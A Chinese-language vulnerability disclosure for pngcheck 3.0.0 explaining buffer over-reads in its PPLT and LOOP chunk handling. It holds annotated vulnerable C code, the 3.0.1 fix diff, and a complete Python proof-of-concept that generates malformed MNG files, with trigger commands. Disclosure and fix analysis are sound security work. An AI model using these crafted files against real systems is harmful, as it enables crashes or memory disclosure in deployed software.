---
categories: [pngcheck, Vulns, Security]
tags: [Out-of-bounds Read]
---

# Vulns in pngcheck 3.0.0

## 漏洞概要

[pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) 是一个用于验证 PNG / JNG / MNG 文件格式的命令行工具。

Two buffer over-read found in pngcheck 3.0.0.

处理 PPLT 和 LOOP 两个块时，发生越界读取：

- PPLT 块：当 `last_idx` < `first_idx` 时, `bytes_left` 递增而不是递减
- LOOP 块：未充分验证块大小 `sz`

## 漏洞原理

源码地址：[http://www.libpng.org/pub/png/src/pngcheck-3.0.0.zip](http://www.libpng.org/pub/png/src/pngcheck-3.0.0.zip)

### PPLT

```c title="pngcheck.c" linenums="4058" hl_lines="31"
} else if (strcmp(chunkid, "PPLT") == 0) {
  if (png || jng) {
    printf("%s  PPLT not defined in %cNG\n", verbose? ":":fname,
      png? 'P':'J');
    set_err(kMinorError);
  } else if (sz < 4 || sz > BS) {
    printf("%s  invalid %slength\n",
      verbose? ":":fname, verbose? "":"PPLT ");
    set_err(kMinorError);
  } else {
    char *plus;
    uch dtype = buffer[0];
    uch first_idx = buffer[1];
    uch last_idx = buffer[2];
    uch *buf = buffer+3;
    int bytes_left = sz-3;
    int samples, npplt = 0, nblks = 0;

    if (!verbose && printpal && !quiet)
      printf("  PPLT chunk");
    if (verbose)
      printf(": %s\n", U2NAME(dtype, pplt_delta_type));
    plus = (dtype & 1)? "+" : "";
    if (dtype < 2)
      samples = 3;
    else if (dtype < 4)
      samples = 1;
    else
      samples = 4;
    while (bytes_left > 0) {
      bytes_left -= samples*(last_idx - first_idx + 1);
      if (bytes_left < 0)
        break;
      ++nblks;
      for (i = first_idx;  i <= last_idx;  ++i, buf += samples) {
        ++npplt;
        if (printpal) {
          if (samples == 4)
            printf("    %3d:  %s(%3d,%3d,%3d,%3d) = "
              "%s(0x%02x,0x%02x,0x%02x,0x%02x)\n", i,
              plus, buf[0], buf[1], buf[2], buf[3],
              plus, buf[0], buf[1], buf[2], buf[3]);
          else if (samples == 3)
            printf("    %3d:  %s(%3d,%3d,%3d) = %s(0x%02x,0x%02x,0x%02x)\n",
              i, plus, buf[0], buf[1], buf[2],
              plus, buf[0], buf[1], buf[2]);
          else
            printf("    %3d:  %s(%3d) = %s(0x%02x)\n", i,
              plus, *buf, plus, *buf);
        }
      }
      if (bytes_left > 2) {
        first_idx = buf[0];
        last_idx = buf[1];
        buf += 2;
        bytes_left -= 2;
      } else if (bytes_left)
        break;
    }
    if (bytes_left) {
      printf("%s  invalid %slength (too %s bytes)\n",
        verbose? ":" : fname, verbose? "" : "PPLT ",
        (bytes_left < 0)? "few" : "many");
      set_err(kMinorError);
    }
    if (verbose && no_err(kMinorError))
      printf("    %d %s palette entr%s in %d block%s\n",
        npplt, (dtype & 1)? "delta" : "replacement", npplt== 1? "y":"ies",
        nblks, nblks== 1? "":"s");
  }
  last_is_IDAT = last_is_JDAT = 0;
```

4088 行，`bytes_left` 在每次循环中递减 `samples*(last_idx - first_idx + 1)`，当 `last_idx` 小于 `first_idx` 时，`samples*(last_idx - first_idx + 1)` 变为负数，导致 `bytes_left` 在每次都递增，循环永不终止。

### LOOP

同 [3.0.1 中的漏洞](./vulns-3.0.1.md)。

## 漏洞复现

- POC 代码：[poc.py](https://github.com/13m0n4de/pngcheck-vulns/blob/main/vulns-3.0.0/poc.py)
- POC 图片：
    - [poc-loop.mng](https://github.com/13m0n4de/pngcheck-vulns/blob/main/vulns-3.0.0/poc-loop.mng)
    - [poc-pplt.mng](https://github.com/13m0n4de/pngcheck-vulns/blob/main/vulns-3.0.0/poc-pplt.mng)

```python title="poc.py"
#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC files demonstrating multiple vulnerabilities in pngcheck 3.0.0:

- Global buffer over-read in PPLT chunk when last_index < first_index
- Global buffer over-read in LOOP chunk due to unchecked chunk size

Each POC can be generated individually or all at once using the 'all' option.
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)


MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(
    file_format: Struct, chunks: list[tuple[bytes, bytes]], output_path: pathlib.Path
) -> None:
    file_format.build_file(
        dict(chunks=[create_chunk(*chunk) for chunk in chunks]),
        output_path,
    )


POCS = {
    # PPLT chunk
    # Command: pngcheck poc-pplt.mng
    "pplt": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"PPLT",
                b"\x04"  # pplt_delta_type(1)
                + b"\xff\x00" * 64,  # (first_index(1) + last_index(1)) * 64
                # when last_idx(0x00) < first_idx(0xff), bytes_left += samples * 256
            ),
            (b"MEND", b""),
        ],
    ),
    # LOOP chunk
    # Command: pngcheck -v poc-loop.mng
    "loop": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"LOOP",
                b"\x00"  # nest_level(1)
                + b"\x00\x00\x00\x01"  # iteration_count(4)
                + b"\x00"  # termination_condition(1)
                + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
            ),
            (b"MEND", b""),
        ],
    ),
}


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 3.0.0 vulnerabilities (global buffer "
            "over-read in PPLT and LOOP chunks)"
        )
    )
    parser.add_argument(
        "type",
        choices=["all"] + list(POCS.keys()),
        help="Vulnerability type to generate POC for ('all' to generate all types)",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        help="Output file path (default: poc-<type>.mng)",
    )
    args = parser.parse_args()

    if args.type == "all":
        for poc_type, (file_format, chunks) in POCS.items():
            output_path = args.output or pathlib.Path(f"poc-{poc_type}.mng")
            print(f"Generating {poc_type} chunk vulnerability POC...")
            generate_poc(file_format, chunks, output_path)
        print("POC files generated successfully")
    else:
        file_format, chunks = POCS[args.type]
        if not args.output:
            args.output = pathlib.Path(f"poc-{args.type}.mng")
        print(f"Generating {args.type} chunk vulnerability POC...")
        generate_poc(file_format, chunks, args.output)
        print("POC file generated successfully")


if __name__ == "__main__":
    main()
```

```
$ python poc.py all

$ pngcheck -v poc-loop.mng
$ pngcheck poc-pplt.mng
```

## 漏洞修复

### PPLT

官方在 v3.0.1 版本中添加 `sz - samples < base` 判断来修复这个漏洞。

```diff
@@ -4069,7 +4068,7 @@
         uch dtype = buffer[0];
         uch first_idx = buffer[1];
         uch last_idx = buffer[2];
-        uch *buf = buffer+3;
+        int base = 3;
         int bytes_left = sz-3;
         int samples, npplt = 0, nblks = 0;

@@ -4089,27 +4088,37 @@
           if (bytes_left < 0)
             break;
           ++nblks;
-          for (i = first_idx;  i <= last_idx;  ++i, buf += samples) {
+          for (i = first_idx;  i <= last_idx;  ++i, base += samples) {
+            if (sz - samples < base) {
+              printf("%s  implied sample outside %schunk bounds\n",
+                verbose? ":":fname, verbose? "":"PPLT ");
+              set_err(kMinorError);
+              /* break out of outer loop, and suppress additional length error */
+              bytes_left = 0;
+              break;
+            }
             ++npplt;
             if (printpal) {
               if (samples == 4)
                 printf("    %3d:  %s(%3d,%3d,%3d,%3d) = "
                   "%s(0x%02x,0x%02x,0x%02x,0x%02x)\n", i,
-                  plus, buf[0], buf[1], buf[2], buf[3],
-                  plus, buf[0], buf[1], buf[2], buf[3]);
+                  plus, buffer[base + 0], buffer[base + 1],
+                  buffer[base + 2], buffer[base + 3],
+                  plus, buffer[base + 0], buffer[base + 1],
+                  buffer[base + 2], buffer[base + 3]);
               else if (samples == 3)
                 printf("    %3d:  %s(%3d,%3d,%3d) = %s(0x%02x,0x%02x,0x%02x)\n",
-                  i, plus, buf[0], buf[1], buf[2],
-                  plus, buf[0], buf[1], buf[2]);
+                  i, plus, buffer[base + 0], buffer[base + 1], buffer[base + 2],
+                  plus, buffer[base + 0], buffer[base + 1], buffer[base + 2]);
               else
                 printf("    %3d:  %s(%3d) = %s(0x%02x)\n", i,
-                  plus, *buf, plus, *buf);
+                  plus, buffer[base], plus, buffer[base]);
             }
           }
           if (bytes_left > 2) {
-            first_idx = buf[0];
-            last_idx = buf[1];
-            buf += 2;
+            first_idx = buffer[base + 0];
+            last_idx = buffer[base + 1];
+            base += 2;
             bytes_left -= 2;
           } else if (bytes_left)
             break;
```

### LOOP

同 [3.0.1 中的修复方案](./vulns-3.0.1.md)。

## 关于 sPLT 中的漏洞

尽管官方安全公告中提到了 sPLT 块中的漏洞，但由于 `toread` 大小限制和 `remainder` 必须正好被 `entry_sz` 整除的要求，实际上很难利用这个漏洞。

## 参考资料

- [MNG (Multiple-image Network Graphics) Format](http://www.libpng.org/pub/mng/spec)
